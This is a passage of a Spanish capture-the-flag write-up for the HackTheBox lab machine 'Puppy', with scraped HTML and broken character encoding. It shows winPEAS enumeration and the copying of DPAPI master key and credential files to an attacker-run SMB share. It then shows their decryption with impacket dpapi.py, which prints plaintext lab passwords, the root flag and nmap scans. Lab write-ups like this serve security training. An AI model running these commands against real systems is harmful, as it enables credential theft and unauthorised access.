https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/207d3f3e-bc37-4b37-ba85-5c4fa16d48c4?X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=releaseassetproduction%2F20250607%2Fus-east-1%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20250607T191444Z\u0026amp;X-Amz-Expires=300\u0026amp;X-Amz-Signature=81be8126c8c0a48b4ad96347f3825ffc8a7c84640cab34ab7df9f980940a22c1\u0026amp;X-Amz-SignedHeaders=host\u0026amp;response-content-disposition=attachment%3B%20filename%3DwinPEASx64.exe\u0026amp;response-content-type=application%2Foctet-stream Resolviendo objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ... Conectando con objects.githubusercontent.com (objects.githubusercontent.com)[185.199.110.133]:443... conectado. Petici√≥n HTTP enviada, esperando respuesta... 200 OK Longitud: 9842176 (9,4M) [application/octet-stream] Grabando a: ¬´winPEASx64.exe¬ª winPEASx64.exe 100%[======================================================================================================================\u0026gt;] 9,39M 51,1MB/s en 0,2s 2025-06-07 21:14:48 (51,1 MB/s) - ¬´winPEASx64.exe¬ª guardado [9842176/9842176] Con el winPEAS encontramos informaci√≥n relacionada con DPAPI.\nDPAPI (Data Protection API) DPAPI (Data Protection API) es un componente de Windows que permite cifrar y descifrar datos utilizando las credenciales del usuario o del sistema. Es usado por aplicaciones para almacenar contrase√±as, claves y otros datos sensibles de forma segura.\nDPAPI Master Keys Las Master Keys son archivos que contienen una clave maestra generada por DPAPI para cada usuario, estas claves son usadas para cifrar/descifrar otros secretos almacenados.\nDPAPI Credentials File Son archivos que contienen credenciales cifradas con DPAPI como contrase√±as etc.\nDescargar archivos con smb server Primero viajo a la ruta en la que se encuentra la Master Key para descargarme el archivo cuando llego al directorio no me sale el archivo as√≠ que supongo que esta en oculto.\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\u0026gt; Get-ChildItem -Force -Hidden \u0026#34;C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\u0026#34; Directory: C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 3/8/2025 7:40 AM 740 556a2412-1275-4ccf-b721-e6a0b4f90407 -a-hs- 2/23/2025 2:36 PM 24 Preferred Con lo cual vamos a proceder a descargarlo con smb server.\n‚ùØ sudo smbserver.py smbFolder $(pwd) -smb2support [sudo] contrase√±a para borhub: /usr/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81. import pkg_resources Impacket v0.11.0 - Copyright 2023 Fortra [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.11.70,49903) [*] AUTHENTICATE_MESSAGE (\\,DC) [*] User DC\\ authenticated successfully [*] :::00::aaaaaaaaaaaaaaaa [*] Connecting Share(1:IPC$) [*] Connecting Share(2:smbFolder) [*] Disconnecting Share(1:IPC$) [*] Disconnecting Share(2:smbFolder) [*] Closing down connection (10.10.11.70,49903) [*] Remaining connections [] Y repetimos el proceso pero con los archivos con las credenciales.\nLocal Credential Data *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\u0026gt; Get-ChildItem -Force -Hidden \u0026#34;C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\u0026#34; Directory: C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials ‚ÄãMode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 3/8/2025 8:14 AM 11068 DFBE70A7E5CC19A398EBF1B96859CE5D *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\u0026gt; copy C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D \\\\10.10.15.254\\smbFolder\\ Enterprise Credential Data *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\u0026gt; Get-ChildItem -Force \u0026#34;C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\\\u0026#34; Directory: C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials‚Äã Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 3/8/2025 8:14 AM 11068 DFBE70A7E5CC19A398EBF1B96859CE5D *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt; copy C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9 \\\\10.10.15.254\\smbFolder\\ Obtener credenciales archivos - Impacket-Dpapi.py Primero necesitamos obtener la clave maestra descifrada y para ello vamos a usar dpapi.py.\n‚ùØ dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password \u0026#39;ChefSteph2025!\u0026#39; -sid S-1-5-21-1487982659-1829050783-2281216199-1107 Impacket v0.11.0 - Copyright 2023 Fortra [MASTERKEYFILE] Version : 2 (2) Guid : 556a2412-1275-4ccf-b721-e6a0b4f90407 Flags : 0 (0) Policy : 4ccf1275 (1288639093) MasterKeyLen: 00000088 (136) BackupKeyLen: 00000068 (104) CredHistLen : 00000000 (0) DomainKeyLen: 00000174 (372) Decrypted key with User Key (MD4 protected) Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 Una vez hemos obtenido la clave vamos a descifrar el archivo de credenciales.\n‚ùØ dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 /usr/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81. import pkg_resources Impacket v0.11.0 - Copyright 2023 Fortra [CREDENTIAL] LastWritten : 2025-03-08 15:54:29 Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH) Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE) Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD) Target : Domain:target=PUPPY.HTB Description : Unknown : Username : steph.cooper_adm Unknown : FivethChipOnItsWay2025! Root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; type root.txt a156d9df5a1856a37db713bac39f4d21 ","permalink":"https://borhuub.github.io/writeups/puppy/","summary":"\u003cp\u003eM√°quina Medium - Windows | Credenciales levi.james / KingofAkron2025!\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Puppy Machine\" loading=\"lazy\" src=\"/img/puppy/puppy_machine.png\"\u003e\u003c/p\u003e\n\u003ch1 id=\"reconocimiento\"\u003eReconocimiento\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ sudo nmap -p- --open -sS --min-rate \u003cspan class=\"m\"\u003e5000\u003c/span\u003e -vvv -n -Pn 10.10.11.70 -oG ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esudo\u003cspan class=\"o\"\u003e]\u003c/span\u003e contrase√±a para borhub:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost discovery disabled \u003cspan class=\"o\"\u003e(\u003c/span\u003e-Pn\u003cspan class=\"o\"\u003e)\u003c/span\u003e. All addresses will be marked \u003cspan class=\"s1\"\u003e\u0026#39;up\u0026#39;\u003c/span\u003e and scan \u003cspan class=\"nb\"\u003etimes\u003c/span\u003e may be slower.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.95 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2025-06-02 09:32 CEST\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eInitiating SYN Stealth Scan at 09:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanning 10.10.11.70 \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e ports\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 135/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 139/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 111/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 53/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 445/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 3268/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 9389/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 593/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 5985/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 636/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 2049/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49664/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 63992/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 3260/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49667/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 64010/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 3269/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 389/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49670/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 88/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 49669/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 464/tcp on 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCompleted SYN Stealth Scan at 09:32, 26.40s elapsed \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e total ports\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.70\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up, received user-set \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.052s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanned at 2025-06-02 09:32:02 CEST \u003cspan class=\"k\"\u003efor\u003c/span\u003e 26s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e65513\u003c/span\u003e filtered tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003eno-response\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT STATE SERVICE REASON\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp open domain syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp open kerberos-sec syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e111/tcp open rpcbind syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp open msrpc syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp open netbios-ssn syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp open ldap syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp open microsoft-ds syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp open kpasswd5 syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp open http-rpc-epmap syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp open ldapssl syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2049/tcp open nfs syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3260/tcp open iscsi syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open globalcatLDAP syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open globalcatLDAPssl syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e5985/tcp open wsman syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9389/tcp open adws syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49664/tcp open unknown syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49667/tcp open unknown syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49669/tcp open unknown syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49670/tcp open unknown syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e63992/tcp open unknown syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e64010/tcp open unknown syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRead data files from: /usr/bin/../share/nmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 26.45 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tRaw packets sent: \u003cspan class=\"m\"\u003e131060\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e5.767MB\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e Rcvd: \u003cspan class=\"m\"\u003e34\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e1.496KB\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49669,49670,63992,64010 10.10.11.70 -oN targeted\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.95 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2025-06-02 09:35 CEST\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e puppy.htb \u003cspan class=\"o\"\u003e(\u003c/span\u003e10.10.11.70\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.097s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBug in iscsi-info: no string output.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp open domain Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp open kerberos-sec Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2025-06-02 14:35:30Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e111/tcp open rpcbind 2-4 \u003cspan class=\"o\"\u003e(\u003c/span\u003eRPC \u003cspan class=\"c1\"\u003e#100000)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rpcinfo:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e program version port/proto service\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100000\u003c/span\u003e 2,3,4 111/tcp rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100000\u003c/span\u003e 2,3,4 111/tcp6 rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100000\u003c/span\u003e 2,3,4 111/udp rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100000\u003c/span\u003e 2,3,4 111/udp6 rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100003\u003c/span\u003e 2,3 2049/udp nfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100003\u003c/span\u003e 2,3 2049/udp6 nfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100005\u003c/span\u003e 1,2,3 2049/udp mountd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100005\u003c/span\u003e 1,2,3 2049/udp6 mountd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100021\u003c/span\u003e 1,2,3,4 2049/tcp nlockmgr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100021\u003c/span\u003e 1,2,3,4 2049/tcp6 nlockmgr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100021\u003c/span\u003e 1,2,3,4 2049/udp nlockmgr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100021\u003c/span\u003e 1,2,3,4 2049/udp6 nlockmgr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100024\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e 2049/tcp status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100024\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e 2049/tcp6 status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"m\"\u003e100024\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e 2049/udp status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ \u003cspan class=\"m\"\u003e100024\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e 2049/udp6 status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp open msrpc Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp open netbios-ssn Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp open ldap Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: PUPPY.HTB0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp open microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp open kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp open tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2049/tcp open nlockmgr 1-4 \u003cspan class=\"o\"\u003e(\u003c/span\u003eRPC \u003cspan class=\"c1\"\u003e#100021)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3260/tcp open iscsi?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open ldap Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: PUPPY.HTB0., Site: Default-First-Site-Name\u003cspan 